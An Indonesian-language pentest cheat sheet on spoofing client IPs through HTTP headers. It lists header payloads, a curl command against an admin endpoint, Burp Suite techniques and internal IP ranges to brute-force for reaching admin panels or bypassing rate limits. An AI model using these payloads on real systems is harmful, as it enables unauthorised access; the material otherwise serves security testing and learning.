# IP-Spoofing via HTTP Header
###### severity: Tergantung efek
###### fungsing: bypass, manipulasi, akses internal
---

**Penjelasan**
Banyak aplikasi web `bersembunyi` di balik Load Balancer atau Proxy. Karena semua trafik yang sampai ke server aplikasi berasal dari IP Proxy tersebut, desainer web menggunakan header tertentu untuk mengetahui IP asli pengguna.

Masalah muncul jika aplikasi terlalu percaya pada isi header tersebut tanpa memverifikasi apakah itu benar-benar dari Proxy terpercaya atau kiriman manual dari penyerang.

**Daftar Header & Payloadnya**


***Standard & Common***

| Header Name        | Expert Payload Example                     | Target / Context                                      |
|-------------------|--------------------------------------------|-------------------------------------------------------|
| X-Forwarded-For   | 127.0.0.1, 10.0.0.5, 192.168.1.1           | Paling umum; digunakan untuk bypass ACL & rate limit   |
| X-Real-IP         | 127.0.0.1                                  | Standar Nginx; sering dipercaya sebagai IP asli       

***Old / Legacy***

| Header Name   | Expert Payload Example | Target / Context                                  |
|--------------|----------------------|--------------------------------------------------|
| Client-IP    | 127.0.0.1           | Sistem lama / aplikasi PHP custom                |
| X-Client-IP  | 127.0.0.1           | Variasi Client-IP; sering di CMS lama            |


***Infrastructure Specific***

| Header Name        | Expert Payload Example | Target / Context                                      |
|-------------------|----------------------|-------------------------------------------------------|
| True-Client-IP    | 127.0.0.1           | Akamai / Cloudflare Enterprise                        |
| CF-Connecting-IP  | 127.0.0.1           | Cloudflare (misconfig backend)                        |
| Fastly-Client-IP  | 127.0.0.1           | Infrastruktur Fastly                                  |


***Internal / Origin***

| Header Name        | Expert Payload Example | Target / Context                                      |
|-------------------|----------------------|-------------------------------------------------------|
| X-Originating-IP  | 127.0.0.1           | Menipu aplikasi seolah request dari internal/admin    |
| X-Remote-IP       | 127.0.0.1           | Variasi bypass akses internal                         |
| X-Remote-Addr     | 127.0.0.1           | Target langsung ke variabel internal server           |


***Modern / Standardized***

| Header Name | Expert Payload Example                          | Target / Context                          |
|------------|-------------------------------------------------|-------------------------------------------|
| Forwarded  | for=127.0.0.1;proto=http;by=127.0.0.1           | RFC 7239; standar modern                  |



***Proxy Specific***

| Header Name      | Expert Payload Example | Target / Context                              |
|-----------------|----------------------|-----------------------------------------------|
| X-ProxyUser-Ip  | 127.0.0.1           | Google Cloud Load Balancer                    |


***Contoh Penggunaan (curl)***

```bash
curl https://target.com/api/admin \
-H "X-Forwarded-For: 127.0.0.1" \
-H "X-Real-IP: 127.0.0.1"
```
---

**Teknik - Teknik**
berikut beberapa teknik yang bisa kamu gunakan untuk melakukan manipulasi header:

***A. Kombinasi Payload Expert (Multi-Hop Bypass)***
Seringkali server hanya mengambil IP paling kiri atau paling kanan dari sebuah daftar IP. Gunakan teknik kombinasi ini di Burp Suite:
+ Daftar IP Internal (Comma Separated):
```bash
X-Forwarded-For: 127.0.0.1, 10.0.0.1, 192.168.1.1
```

+ Identitas Ganda (Menipu Proxy):
```bash
X-Forwarded-For: 8.8.8.8
X-Forwarded-For: 127.0.0.1
(Mengirim dua header yang sama namun beda isi)
```

+ Bypass IPv6:
```bash
X-Forwarded-For: [::1]
(Terkadang sistem hanya memfilter IPv4 127.0.0.1, tapi lupa memfilter IPv6 localhost ::1)
```

***B. Cara Cepat di Burp Suite (Match and Replace)***
Untuk mempermudah kamu "ngoprek" hari ini, simpan ini di settingan Match and Replace Burp kamu agar setiap request otomatis membawa "KTP Palsu":
```bash
1. Match: (kosongkan)
2. Replace: X-Forwarded-For: 127.0.0.1
3. Type: Request Header
```
***Mencari IP Internal***
Jika `127.0.0.1` tidak berhasil, ada kemungkinan IP internalnya menggunakan range private. Coba gunakan IP ini satu per satu (atau pakai Intruder):
```bash
10.0.0.1 s/d 10.0.0.255
172.16.0.1 s/d 172.16.0.255
192.168.0.1 s/d 192.168.0.255
```
***catatan***
hal ini sering digunakan dalam melakukan bypass pada endpoint yang di larang dimasuki, seperti panel `admin` atau sejenisnya. Sebab terkadang server tidak melakukan validasi atau kesalahan konfigurasi 